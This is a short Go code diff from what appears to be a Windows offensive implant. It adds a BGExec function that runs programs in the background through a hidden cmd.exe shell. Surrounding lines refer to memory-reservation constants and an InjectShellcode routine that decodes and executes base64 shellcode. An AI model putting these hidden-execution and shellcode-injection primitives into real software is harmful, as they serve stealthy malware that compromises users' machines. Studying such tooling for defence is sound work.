@@ -12,11 +12,22 @@ const (
 	MEM_RESERVE = 0x2000
 )
 
-// TODO make this work again through iShell, for now just execute cmds
 func GetShell() *exec.Cmd {
 	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return cmd
+}
+
+// func BGExec() *exec.Cmd {
+func BGExec(prog string, args []string) (int, error) {
+	cmd := GetShell()
+	cmd.Args = append(cmd.Args, "/c", "start", "/B", prog)
+	cmd.Args = append(cmd.Args, args...)
+	err := cmd.Start()
+	if err != nil {
+		return 1, err
+	}
+	return 0, err
 }
 
 // InjectShellcode decodes a base64 encoded shellcode and calls ExecShellcode on the decode value.
